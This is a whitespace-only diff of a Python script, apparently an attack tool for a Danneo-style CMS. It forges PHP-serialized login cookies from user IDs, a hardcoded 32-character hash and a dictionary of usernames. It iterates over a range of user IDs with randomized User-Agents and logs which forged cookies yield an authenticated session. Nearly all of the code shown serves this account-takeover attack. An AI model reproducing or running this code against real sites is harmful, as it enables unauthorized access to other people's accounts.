@@ -16,22 +16,22 @@ import requests
 # for config manipulation
 import configparser
 import ast # https://stackoverflow.com/a/56084659/12258312
-	
+
 # for data manipulation (yes that's right!)
 import urllib.parse # https://stackoverflow.com/a/48072647/12258312
-	
+
 # for visuals
 from etaprogress.progress import ProgressBar
-	
+
 def APP_NAME():
 	return "danneo-tools"
 
 def APP_SHORT():
 	return "dan-tools"
-	
+
 def DELIM():
 	return "|"
-	
+
 def CFG():
 	return APP_SHORT() + ".ini"
 
@@ -46,26 +46,26 @@ def merge_two_dicts(x, y):
 
 def fti_digest(pfti, input):
 	return pfti.index(input)
-	
+
 def getUnixTime():
 	return toHexCustom(int(time.time()))
-	
-def toHexCustom(dec): 
-	return str(hex(dec).split('x')[-1])	
+
+def toHexCustom(dec):
+	return str(hex(dec).split('x')[-1])
 
 
 def main():
-	
+
 	config = configparser.ConfigParser()
 	config.read(CFG())
-	
+
 	print("[P] Initialising User-Agent, please wait (1/3)")
 	ua = UserAgent()
 	print("[P] Initialising User-Agent, please wait (2/3)")
 	#ua.update()
 	print("[P] Initialising User-Agent, please wait (3/3)")
 	print("")
-	
+
 	if len(sys.argv) != 3: #-1
 		print("USAGE: python3 "+__file__+" <webconfig> <secfile>")
 		print("Tries logging in via cookies")
@@ -76,73 +76,73 @@ def main():
 		# rudimental inputs
 		web  = str(sys.argv[1])
 		fdict = str(sys.argv[2])
-		
+
 		assert(config != {})
 		assert(config[web] != {})
-		
+
 		# config inputs
 		url = config[web]["url"]
 		authed_url = config[web]["login_status_url"]
 		headers = config[web]["headers"]
-		
+
 		login_len_false = config[web]["login_len_false"]
 		login_len_true = config[web]["login_len_true"]
 		interval = int(config[web]["login_interval"])
 		cookie_base = "{'" + config[web]["user_cookie"] + "': '"
-		
+
 		assert(len(url))
 		assert(len(authed_url))
 		assert(len(login_len_false))
 		assert(len(login_len_true))
-		
-		# process inputs  complexely 
+
+		# process inputs  complexely
 		## url
 		work_url = url + authed_url
 		print(work_url)
-		
+
 		is_logged_on_range_false = ast.literal_eval(login_len_false)
 		is_logged_on_range_true = ast.literal_eval(login_len_true)
 		assert(len(is_logged_on_range_false) == 2)
 		assert(len(is_logged_on_range_true) == 2)
-		
-		pre_header = ast.literal_eval(headers)		
+
+		pre_header = ast.literal_eval(headers)
 		headers = merge_two_dicts({'User-Agent': ua.random}, pre_header)
-				
+
 		# files
 		## MISC
 		utime = getUnixTime()
-		
-		
+
+
 		fname_bad  = APP_SHORT() + "_" + utime + "_free" + ".text"
 		fname_good = APP_SHORT() + "_" + utime + "_tken" + ".text"
 		fname_log  = APP_SHORT() + "_" + utime + "_log" + ".text"
-		
+
 		fbad  = open(fname_bad,  "w+", encoding="utf-8")
 		fgood = open(fname_good, "w+", encoding="utf-8")
 		flog = open(fname_log, "w+", encoding="utf-8")
-		
-	
+
+
 		with open(fdict, encoding="utf-8") as f:
 			content = f.read().splitlines()
-			
+
 		## Misc
 		username_count = len(content)
-		
+
 		id_min = int(config[web]["user_id_min"])
 		id_max = int(config[web]["user_id_max"])
 		id_total = (id_max - id_min) + 1
 		assert(id_total > 0)
-		
+
 		work = id_total
 		assert(username_count > 0)
-		
-		bar = ProgressBar(work, max_width=40)		
-		
+
+		bar = ProgressBar(work, max_width=40)
+
 		## Final out
 		whatToLog = __file__ + " is starting!\n" \
 		"[*] config["+web+"] = "+str(config[web])+"\n" \
 		"[*] username_count = "+str(username_count)+"\n" \
-		"The script will start in ~5s" 
+		"The script will start in ~5s"
 		flog.write(whatToLog+"\n")
 		print(whatToLog)
 		time.sleep(5)
@@ -163,8 +163,8 @@ def main():
 
 
 	finprint()
-	
-	
+
+
 def gen_cook_string(id, username):
 	idk_todo_recon = "6bcc45cfd3d5ee44c98fc480a167caf8"
 	C34 = chr(34)
@@ -173,28 +173,28 @@ def gen_cook_string(id, username):
 	i0_prefix = "a:3:{i:0;s:"
 	i0_string = str(id)
 	i0_slen = len(i0_string)
-	
+
 	ret = i0_prefix + str(i0_slen) + ":" + C34 + i0_string + C34 + ";"
-	
+
 	# 2/3
 	i1_prefix = "i:1;s:"
 	i1_string = idk_todo_recon #md5? Password
 	i1_slen = len(i1_string)
-	
+
 	assert(i1_slen == 32) # always of len 32. MD5?
-	
+
 	ret = ret + i1_prefix + str(i1_slen) + ":" + C34 + i1_string + C34 + ";"
-	
+
 	# 3/3
-	i2_prefix = "i:2;s:" 
+	i2_prefix = "i:2;s:"
 	i2_string = username #md5? Password
 	i2_slen = len(i2_string)
-	
+
 	ret = ret + i2_prefix + str(i2_slen) + ":" + C34 + i2_string + C34 + ";"
-	
+
 	# fin
 	ret = ret + "}"
-	
+
 	return ret
 
 def cook_string_to_cookie(s):
